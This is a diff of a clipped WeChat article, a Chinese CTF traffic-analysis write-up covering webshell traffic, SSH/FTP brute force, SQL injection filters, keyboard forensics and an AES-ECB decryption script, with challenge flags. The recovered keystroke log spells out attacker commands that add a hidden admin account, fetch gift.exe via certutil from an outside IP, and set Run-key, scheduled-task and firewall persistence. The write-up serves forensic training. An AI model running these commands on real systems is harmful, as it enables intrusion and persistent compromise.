@@ -2,23 +2,23 @@
 title: 【微信】好靶场杯第一届综合赛道（流量分析-古法赛道）详细版Wireup
 source: https://mp.weixin.qq.com/s/D4YSX_1-ZpcbT5WmYfcXkg
 source_host: mp.weixin.qq.com
-clip_date: 2026-07-23T13:25:08+08:00
-trace_id: 445fb05d-73b5-4f73-a464-e9e5d05ff308
+clip_date: 2026-07-23T21:04:14+08:00
+trace_id: aaa0769f-0f1c-4202-ba78-8f1a0d803f0a
 content_hash: 54f4dded0ce6ef9c98ce6b3d2dcfb5ab6d48a7770900853617f8f5ced27d1255
-status: summarized
+status: synced
 tags:
   - 微信
   - CTF
   - 协议分析
 series: null
-feed_source: 公众号聚合·Doonsec
-ai_summary: 本文详细解析了好靶场杯CTF流量分析赛道的解题过程，通过分析多种协议流量提取攻击细节和flag。
+feed_source: null
+ai_summary: 文章核心是详细讲解CTF流量分析赛道中多道题目的解题流程，涵盖Webshell利用、SSH爆破、SQL注入等攻击场景的流量分析与关键信息提取。
 ai_summary_style: key-points
 images_status:
   total: 167
   succeeded: 167
   failed_urls: []
-notion_page_id: 3a675244-d011-81a1-bcd4-e71194a4f9e4
+notion_page_id: 3ab75244-d011-81df-bfc5-f6ec7fce4f3f
 ioc:
   cves: []
   cwes: []
@@ -38,13 +38,13 @@ ioc:
 
 > 💡 **AI 总结（key-points）**
 >
-> 本文详细解析了好靶场杯CTF流量分析赛道的解题过程，通过分析多种协议流量提取攻击细节和flag。
+> 文章核心是详细讲解CTF流量分析赛道中多道题目的解题流程，涵盖Webshell利用、SSH爆破、SQL注入等攻击场景的流量分析与关键信息提取。
 > 
-> - **工具与方法**：使用Wireshark过滤命令结合lovelyspark、CyberChef等工具，解密哥斯拉、冰蝎等Webshell流量。
-> - **攻击链路**：攻击者通过fscan内网扫描，利用WebStack主题漏洞上传哥斯拉Webshell，植入隐藏账户和计划任务后门。
-> - **暴力破解**：SSH和FTP服务遭受Hydra工具暴力破解，成功登录后建立反弹Shell、写入公钥后门。
-> - **数据提取**：SQL注入使用sqlmap枚举数据库表获取flag，FTP窃取敏感文件，键盘取证还原用户密码和攻击命令。
-> - **解密技术**：USB流量通过镜像翻转解码，DNS流量使用AES-ECB加密，需提取密钥解密获得flag。
+> - **攻击工具与探测行为：** 攻击者使用fscan进行内网资产探测，通过ARP/ICMP探活后批量扫描常见端口；另一场景使用Hydra暴力破解SSH和FTP服务。
+> - **漏洞利用与Webshell：** 利用WordPress WebStack主题任意文件上传漏洞上传哥斯拉Webshell，其加密方式为PHP_XOR_RAW，连接密码在流量中明文可见。
+> - **关键信息提取：** 通过流量分析获取攻击者IP、受害服务器IP、开放端口、主机名、数据库凭据（如wordpress/123456）、隐藏后门账户（如AdminJIU$）及其密码。
+> - **持久化后门手法：** 攻击者在Windows上创建计划任务后门，在Linux上写入Crontab反弹Shell和SSH公钥后门，实现持久化控制。
+> - **加密流量解密：** DNS流量中提取密钥并使用AES-ECB解密获取flag；USB流量通过镜像翻转图像还原flag。
 
 编者荐语：
 
@@ -211,7 +211,9 @@ http.request.method == "POST"
 查看上传的 web.php内容里面有典型哥斯拉结构：
 
 ```perl
-$payloadName='payload';$key='...';@run($data)
+$payloadName='payload';
+$key='...';
+@run($data)
 ```
 
 ![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/cd7dfeef02bb52e0.png)
@@ -225,7 +227,9 @@ $payloadName='payload';$key='...';@run($data)
 首先是上传的 PHP壳
 
 ```php
-function encode($D,$K){$D[$i] = $D[$i]^$c;}
+function encode($D,$K){
+$D[$i] = $D[$i]^$c;
+}
 ```
 
 关于 xor的编码，请求体是 raw body
@@ -336,8 +340,8 @@ SimpleHTTP/0.6 Python/3.12.0
 
 过滤攻击者 HTTP 服务响应,查看响应头
 
-```apache
-ip.src == 192.168.99.28 && tcp.srcport == 8080 && http.response
+```
+ip.src == 192.168.99.28 && tcp.srcport == 8080 && http.response 
 ```
 
 ![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/b8da0db8ebcc4771.png)
@@ -723,7 +727,9 @@ PG_SLEEP
 5
 
 ```sql
-http.request.uri contains "PG_SLEEP"http.request.uri contains "pg_tables"http.request.uri contains "pg_tables" && http.request.uri contains "tablename"
+http.request.uri contains "PG_SLEEP"
+http.request.uri contains "pg_tables"
+http.request.uri contains "pg_tables" && http.request.uri contains "tablename"
 ```
 
 通过 ASCII(SUBSTRING(...)) >数字配合PG_SLEEP(1)判断真假
@@ -745,7 +751,8 @@ secret_flag
 flag{8673db96fa2dceeb}
 
 ```sql
-http.request.uri contains "secret_flag"http.request.uri contains "flag_value"
+http.request.uri contains "secret_flag"
+http.request.uri contains "flag_value"
 ```
 
 ![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/521cc4e0ade7a315.png)
@@ -755,7 +762,10 @@ http.request.uri contains "secret_flag"http.request.uri contains "flag_value"
 123456
 
 ```sql
-http.request.uri contains "public.users"http.request.uri contains "username"http.request.uri contains "%22role%22"http.request.uri contains "password"
+http.request.uri contains "public.users"
+http.request.uri contains "username"
+http.request.uri contains "%22role%22"
+http.request.uri contains "password"
 ```
 
 还原出的 hash
@@ -929,7 +939,33 @@ flag{420E8A8C540D4BE07F0221F46CCFB8EE}
 将重要内容粘贴出来进行分析
 
 ```powershell
-wangruoyaoWr040February!baobao you yige nande xiangyao zhui wo ,hao fan a !gen ge bain<del><del><del>iantai shide ,yizhi jiejin wohaoxiang shi jiao liuluni bang wo xiangxiang zenme banwo xian shui la !baobao wanan <GA>baobao[Win] Rrcmdwhami<del><del><del><del>hoamiipconfignet usernet user happy$ woaini yaoyao @20030613 /addnet localgroup administrators happy$ /addcertutil -urlcache -split -f http"//124.223.18.231/gift.exe :C"\Users\wangruoyao\Desktop\songgei yaoyao de liwu -zhiyou yaoyao cai keyi dakai .exe:copy :C"\Users\wangruoyao\Desktop\songgei *: C"\Windows\Temp\svchost.exeattrib +h +s C"\Windows\Temp\svchost.exereg add :HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run: /v :SystemUpdate: /t REG_SZ /d :C"\Windows\Temp\svchost.exe: /fschtasks /create /tn :WindowsUpdate: /tr :C"\Windows\Temp\svchost.exe: /sc onlogon /ru Systemcopy C"\Windows\Temp\svchost.exe :C"\Users\wangruoyao\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe:netsh advfirewall firewall add rule name=:allow_remote: dir=in action=allow protocol=tcp localport=4444dir C"\Users\wangruoyao\Desktoptype C"\Users\wangruoyao\Desktop\notes.txtnetstat -anotasklistexit
+wangruoyao
+Wr040February!
+baobao you yige nande xiangyao zhui wo ,hao fan a !
+gen ge bain<del><del><del>iantai shide ,yizhi jiejin wo
+haoxiang shi jiao liulu
+ni bang wo xiangxiang zenme ban
+wo xian shui la !
+baobao wanan <GA>baobao
+[Win] R
+rcmd
+whami<del><del><del><del>hoami
+ipconfig
+net user
+net user happy$ woaini yaoyao @20030613 /add
+net localgroup administrators happy$ /add
+certutil -urlcache -split -f http"//124.223.18.231/gift.exe :C"\Users\wangruoyao\Desktop\songgei yaoyao de liwu -zhiyou yaoyao cai keyi dakai .exe:
+copy :C"\Users\wangruoyao\Desktop\songgei *: C"\Windows\Temp\svchost.exe
+attrib +h +s C"\Windows\Temp\svchost.exe
+reg add :HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run: /v :SystemUpdate: /t REG_SZ /d :C"\Windows\Temp\svchost.exe: /f
+schtasks /create /tn :WindowsUpdate: /tr :C"\Windows\Temp\svchost.exe: /sc onlogon /ru System
+copy C"\Windows\Temp\svchost.exe :C"\Users\wangruoyao\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe:
+netsh advfirewall firewall add rule name=:allow_remote: dir=in action=allow protocol=tcp localport=4444
+dir C"\Users\wangruoyao\Desktop
+type C"\Users\wangruoyao\Desktop\notes.txt
+netstat -ano
+tasklist
+exit
 ```
 
 1.受害者计算机的登录用户名是什么？
@@ -1057,7 +1093,23 @@ hbc2@kfcfwa2026!
 密文提取-通用 aes-ecb脚本解密：
 
 ```python
-from base64 import b64decodefrom Crypto.Cipher import AESfrom Crypto.Util.Padding import unpadkey = "aGJjMkBrZmNmd2EyMDI2IQ=="key = b64decode(key)cipher_hex = ("85e99f1b7c61dd5f""da41a0860c6169bb""bd08a975aaed0b0c""3a20563a4f45b571""ac53c35940cd6204""099463929dd66dd3")ciphertext = bytes.fromhex(cipher_hex)cipher = AES.new(key, AES.MODE_ECB)plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)print(plaintext.decode())
+from base64 import b64decode
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+key = "aGJjMkBrZmNmd2EyMDI2IQ=="
+key = b64decode(key)
+cipher_hex = (
+"85e99f1b7c61dd5f"
+"da41a0860c6169bb"
+"bd08a975aaed0b0c"
+"3a20563a4f45b571"
+"ac53c35940cd6204"
+"099463929dd66dd3"
+)
+ciphertext = bytes.fromhex(cipher_hex)
+cipher = AES.new(key, AES.MODE_ECB)
+plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
+print(plaintext.decode())
 ```
 
 ![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/187a35789d7e20b1.png)
